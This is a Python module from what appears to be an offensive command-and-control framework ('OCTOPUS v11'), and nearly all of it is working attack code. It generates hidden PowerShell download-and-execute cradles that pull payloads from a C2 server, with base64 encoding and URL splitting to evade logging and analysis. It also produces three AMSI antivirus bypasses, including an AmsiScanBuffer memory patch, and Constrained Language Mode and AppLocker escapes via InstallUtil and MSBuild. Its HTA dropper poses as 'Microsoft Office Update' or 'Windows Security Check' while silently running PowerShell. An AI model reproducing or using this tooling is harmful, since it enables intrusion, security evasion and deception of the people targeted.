"""
OCTOPUS v11 — PowerShell Stager & Dropper Generator.

Generates various PowerShell-based delivery mechanisms:
  - IEX download cradle (in-memory execution)
  - Base64-encoded PowerShell commands
  - AMSI bypass techniques
  - Constrained Language Mode (CLM) bypass
  - HTA file droppers for initial access

All generated stagers are designed to download and execute the primary
payload (Python implant or shellcode) from the C2 server.
"""

import base64
import logging
import os
import random
import secrets
import string
import textwrap
from typing import List, Optional

logger = logging.getLogger("octopus.c2.implants.powershell")


def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
    """Generate a PowerShell download-and-execute stager.

    Creates a PowerShell one-liner that downloads a payload from
    the C2 URL and executes it in memory using the specified method.

    Supported methods:
      - 'iex': Invoke-Expression with Net.WebClient (classic)
      - 'iwr': Invoke-WebRequest with Invoke-Expression
      - 'xml': System.Xml.XmlDocument-based download (stealthier)
      - 'bits': BITS transfer with execution
      - 'wscript': WScript.Shell COM object

    Args:
        c2_url: URL of the hosted payload.
        method: Download/execute method. Defaults to 'iex'.

    Returns:
        PowerShell stager command string.

    Raises:
        ValueError: If method is not supported.

    Example:
        >>> stager = generate_ps_stager("https://c2.example.com/payload.ps1")
        >>> "DownloadString" in stager
        True
    """
    method = method.lower()

    # Obfuscate the URL slightly (split and join at runtime)
    url_parts = _split_url_for_obfuscation(c2_url)
    url_assembly = "+".join(f"'{p}'" for p in url_parts)

    if method == "iex":
        # Classic Net.WebClient IEX cradle
        var_wc = _rand_var()
        var_url = _rand_var()
        return (
            f"powershell -nop -w hidden -ep bypass -c \""
            f"${var_url}={url_assembly};"
            f"${var_wc}=New-Object Net.WebClient;"
            f"IEX(${var_wc}.DownloadString(${var_url}))\""
        )

    elif method == "iwr":
        # Invoke-WebRequest variant
        var_url = _rand_var()
        return (
            f"powershell -nop -w hidden -ep bypass -c \""
            f"${var_url}={url_assembly};"
            f"IEX((Invoke-WebRequest -Uri ${var_url} -UseBasicParsing).Content)\""
        )

    elif method == "xml":
        # XML document-based download (less commonly flagged)
        var_xml = _rand_var()
        var_url = _rand_var()
        return (
            f"powershell -nop -w hidden -ep bypass -c \""
            f"${var_url}={url_assembly};"
            f"${var_xml}=New-Object System.Xml.XmlDocument;"
            f"${var_xml}.Load(${var_url});"
            f"IEX(${var_xml}.command.a.execute)\""
        )

    elif method == "bits":
        # BITS transfer + execution
        tmp_name = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.ps1"
        var_url = _rand_var()
        return (
            f"powershell -nop -w hidden -ep bypass -c \""
            f"${var_url}={url_assembly};"
            f"Start-BitsTransfer -Source ${var_url} "
            f"-Destination '{tmp_name}';"
            f"& '{tmp_name}';"
            f"Start-Sleep -s 2;"
            f"Remove-Item '{tmp_name}' -Force\""
        )

    elif method == "wscript":
        # WScript.Shell COM object
        var_url = _rand_var()
        var_ws = _rand_var()
        return (
            f"powershell -nop -w hidden -ep bypass -c \""
            f"${var_url}={url_assembly};"
            f"${var_ws}=New-Object -COM WScript.Shell;"
            f"${var_ws}.Run('powershell -nop -w hidden -ep bypass "
            f"-c IEX((New-Object Net.WebClient).DownloadString('''+${var_url}+'''))',0,$true)\""
        )

    else:
        raise ValueError(
            f"Unsupported stager method: {method}. "
            f"Use: iex, iwr, xml, bits, wscript"
        )


def generate_ps_encoded(c2_url: str) -> str:
    """Generate a base64-encoded PowerShell download cradle.

    Creates a PowerShell command where the entire script is base64-encoded
    and passed via the -EncodedCommand parameter. This bypasses many
    command-line logging detections that look for plaintext strings.

    Args:
        c2_url: URL of the hosted payload.

    Returns:
        PowerShell command string with -EncodedCommand parameter.

    Example:
        >>> cmd = generate_ps_encoded("https://c2.example.com/payload.ps1")
        >>> "-EncodedCommand" in cmd
        True
    """
    # Build the inner PowerShell script
    var_wc = _rand_var()
    inner_script = (
        f"${var_wc}=New-Object Net.WebClient;"
        f"IEX(${var_wc}.DownloadString('{c2_url}'))"
    )

    # Encode to UTF-16LE base64 (required by -EncodedCommand)
    encoded = base64.b64encode(
        inner_script.encode("utf-16-le")
    ).decode("ascii")

    return f"powershell -nop -w hidden -ep bypass -EncodedCommand {encoded}"


def generate_ps_amsi_bypass() -> str:
    """Generate an AMSI (Antimalware Scan Interface) bypass.

    Produces a PowerShell snippet that patches the AmsiScanBuffer
    function in memory to always return AMSI_RESULT_CLEAN. This
    disables script-level AV scanning for the current process.

    Multiple bypass techniques are rotated for evasion:
      1. Matt Graeber's reflection-based bypass
      2. Memory patching via P/Invoke
      3. amsiInitFailed field manipulation

    Returns:
        PowerShell AMSI bypass code string.

    Note:
        This bypass must run before any other PowerShell payload code.
        It only affects the current PowerShell process.
    """
    # Rotate between bypass techniques for fingerprint diversity
    technique = random.choice(["reflection", "patch", "initfailed"])

    if technique == "reflection":
        # Reflection-based bypass (obfuscated variable names)
        v1 = _rand_var()
        v2 = _rand_var()
        v3 = _rand_var()
        return textwrap.dedent(f"""\
            # AMSI Bypass — Reflection Method
            ${v1}=[Ref].Assembly.GetType('System.Management.Automation.'+'Am'+'siUtils')
            ${v2}=${v1}.GetField('am'+'siInitFailed','NonPublic,Static')
            ${v2}.SetValue($null,$true)
        """)

    elif technique == "patch":
        # Memory patching bypass via Add-Type
        v1 = _rand_var()
        v2 = _rand_var()
        v3 = _rand_var()
        type_name = f"W{secrets.token_hex(4)}"
        return textwrap.dedent(f"""\
            # AMSI Bypass — Memory Patch
            ${v1}=@"
            using System;
            using System.Runtime.InteropServices;
            public class {type_name} {{
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string name);
                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                    uint flNewProtect, out uint lpflOldProtect);
            }}
"@
            Add-Type ${v1}
            ${v2}=[{type_name}]::LoadLibrary("am"+"si.dll")
            ${v3}=[{type_name}]::GetProcAddress(${v2},"Amsi"+"Scan"+"Buffer")
            $p=0
            [{type_name}]::VirtualProtect(${v3},[uint32]5,0x40,[ref]$p)
            $patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($patch,0,${v3},6)
        """)

    else:  # initfailed
        # Simple amsiInitFailed manipulation
        v1 = _rand_var()
        return textwrap.dedent(f"""\
            # AMSI Bypass — InitFailed
            ${v1}="System.Management.Automation.AmsiUtils"
            [Ref].Assembly.GetType(${v1}).GetField(
                'amsiInitFailed','NonPublic,Static'
            ).SetValue($null,$true)
        """)


def generate_ps_clm_bypass() -> str:
    """Generate a Constrained Language Mode (CLM) bypass.

    Produces a PowerShell snippet that escapes Constrained Language Mode,
    which restricts .NET type access and COM objects. The bypass uses
    PowerShell runspace manipulation to create an unrestricted session.

    Multiple techniques:
      1. Custom runspace with FullLanguage mode
      2. InstallUtil.exe AppLocker bypass
      3. MSBuild inline task execution

    Returns:
        PowerShell CLM bypass code string.

    Note:
        CLM is enforced via AppLocker or Device Guard policies.
        These bypasses may not work in all environments.
    """
    technique = random.choice(["runspace", "installutil", "msbuild"])

    if technique == "runspace":
        v1 = _rand_var()
        v2 = _rand_var()
        v3 = _rand_var()
        return textwrap.dedent(f"""\
            # CLM Bypass — Custom Runspace
            ${v1}=[System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
            ${v1}.ApartmentState="STA"
            ${v1}.ThreadOptions="ReuseThread"
            ${v1}.Open()
            ${v2}=[PowerShell]::Create()
            ${v2}.Runspace=${v1}
            ${v2}.AddScript("\\$ExecutionContext.SessionState.LanguageMode")
            ${v3}=${v2}.Invoke()
            # Now execute payload in FullLanguage mode:
            ${v2}.Commands.Clear()
            ${v2}.AddScript("# INSERT PAYLOAD HERE")
            ${v2}.Invoke()
        """)

    elif technique == "installutil":
        class_name = f"C{secrets.token_hex(4)}"
        return textwrap.dedent(f"""\
            # CLM Bypass — InstallUtil
            # Save this as a .cs file and compile, then run:
            # C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
            #
            # C# payload template:
            # using System;
            # using System.Management.Automation;
            # using System.Management.Automation.Runspaces;
            # using System.Configuration.Install;
            # [System.ComponentModel.RunInstaller(true)]
            # public class {class_name} : Installer {{
            #     public override void Uninstall(System.Collections.IDictionary savedState) {{
            #         Runspace rs = RunspaceFactory.CreateRunspace();
            #         rs.Open();
            #         PowerShell ps = PowerShell.Create();
            #         ps.Runspace = rs;
            #         ps.AddScript("IEX(New-Object Net.WebClient).DownloadString('PAYLOAD_URL')");
            #         ps.Invoke();
            #     }}
            # }}
            Write-Host "Use InstallUtil bypass — see comments for C# template"
        """)

    else:  # msbuild
        task_name = f"T{secrets.token_hex(4)}"
        return textwrap.dedent(f"""\
            # CLM Bypass — MSBuild Inline Task
            # Save as .xml and run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml
            #
            # <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
            #   <Target Name="{task_name}">
            #     <{task_name} />
            #   </Target>
            #   <UsingTask TaskName="{task_name}" TaskFactory="CodeTaskFactory"
            #     AssemblyFile="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
            #     <Task>
            #       <Code Type="Class" Language="cs">
            #         <![CDATA[
            #           using Microsoft.Build.Framework;
            #           using System.Management.Automation;
            #           public class {task_name} : ITask {{
            #             public IBuildEngine BuildEngine {{ get; set; }}
            #             public ITaskHost HostObject {{ get; set; }}
            #             public bool Execute() {{
            #               PowerShell.Create().AddScript("PAYLOAD_HERE").Invoke();
            #               return true;
            #             }}
            #           }}
            #         ]]>
            #       </Code>
            #     </Task>
            #   </UsingTask>
            # </Project>
            Write-Host "Use MSBuild bypass — see comments for XML template"
        """)


def generate_hta_dropper(c2_url: str) -> str:
    """Generate an HTA (HTML Application) file dropper.

    Creates an HTA file that, when opened, downloads and executes a
    PowerShell payload. HTA files run with full trust and bypass most
    browser security restrictions.

    The generated HTA:
      1. Displays a decoy "Loading..." message
      2. Executes PowerShell in the background via WScript.Shell
      3. Downloads and runs the payload from c2_url
      4. Closes the HTA window

    Args:
        c2_url: URL of the hosted payload.

    Returns:
        Complete HTA file content string.

    Example:
        >>> hta = generate_hta_dropper("https://c2.example.com/payload.ps1")
        >>> "<html>" in hta.lower()
        True
        >>> "WScript.Shell" in hta
        True
    """
    # Generate the encoded PowerShell command
    ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{c2_url}')"
    ps_encoded = base64.b64encode(
        ps_cmd.encode("utf-16-le")
    ).decode("ascii")

    # Randomize variable names in VBScript
    v_shell = _rand_var_vbs()
    v_cmd = _rand_var_vbs()

    # Random decoy title and message
    decoy_titles = [
        "Microsoft Office Update",
        "Adobe Flash Player",
        "Windows Security Check",
        "Document Viewer Required",
        "Certificate Validation",
    ]
    decoy_title = random.choice(decoy_titles)
    decoy_id = secrets.token_hex(4).upper()

    hta_content = textwrap.dedent(f"""\
        <html>
        <head>
        <title>{decoy_title}</title>
        <HTA:APPLICATION
            ID="app"
            APPLICATIONNAME="{decoy_title}"
            BORDER="thin"
            BORDERSTYLE="normal"
            CAPTION="yes"
            ICON=""
            MAXIMIZEBUTTON="no"
            MINIMIZEBUTTON="no"
            SHOWINTASKBAR="no"
            SINGLEINSTANCE="yes"
            SYSMENU="yes"
            WINDOWSTATE="normal"
        />
        </head>
        <body style="background-color:#f0f0f0;font-family:Segoe UI,sans-serif;
                      text-align:center;padding-top:80px;">
        <h2 style="color:#333;">&#128274; {decoy_title}</h2>
        <p style="color:#666;">Verifying security components... (ID: {decoy_id})</p>
        <p style="color:#999;font-size:12px;">Please wait, this window will close automatically.</p>

        <script language="VBScript">
            Sub Window_OnLoad
                Set {v_shell} = CreateObject("WScript.Shell")
                {v_cmd} = "powershell -nop -w hidden -ep bypass -EncodedCommand {ps_encoded}"
                {v_shell}.Run {v_cmd}, 0, False
                ' Close HTA after a short delay
                window.setTimeout "window.close()", 3000
            End Sub
        </script>
        </body>
        </html>
    """)

    logger.info("Generated HTA dropper for %s", c2_url)
    return hta_content


# ─── Internal Helpers ────────────────────────────────────────────


def _rand_var(min_len: int = 3, max_len: int = 8) -> str:
    """Generate a random PowerShell variable name.

    Produces lowercase letter-only names that don't collide with
    reserved words.

    Args:
        min_len: Minimum variable name length.
        max_len: Maximum variable name length.

    Returns:
        Random variable name string (without $ prefix).
    """
    length = random.randint(min_len, max_len)
    # Start with a letter, rest alphanumeric
    name = random.choice(string.ascii_lowercase)
    name += "".join(random.choices(string.ascii_lowercase + string.digits, k=length - 1))
    return name


def _rand_var_vbs(min_len: int = 4, max_len: int = 8) -> str:
    """Generate a random VBScript variable name.

    Args:
        min_len: Minimum variable name length.
        max_len: Maximum variable name length.

    Returns:
        Random VBScript-compatible variable name.
    """
    length = random.randint(min_len, max_len)
    name = random.choice(string.ascii_lowercase)
    name += "".join(random.choices(string.ascii_lowercase, k=length - 1))
    return name


def _split_url_for_obfuscation(url: str) -> List[str]:
    """Split a URL into random-length parts for string obfuscation.

    Breaking up URLs prevents static analysis tools from extracting
    IOCs directly from the stager code.

    Args:
        url: URL string to split.

    Returns:
        List of URL fragment strings.
    """
    parts: List[str] = []
    i = 0
    while i < len(url):
        chunk_size = random.randint(3, 10)
        chunk_size = min(chunk_size, len(url) - i)
        parts.append(url[i:i + chunk_size])
        i += chunk_size
    return parts
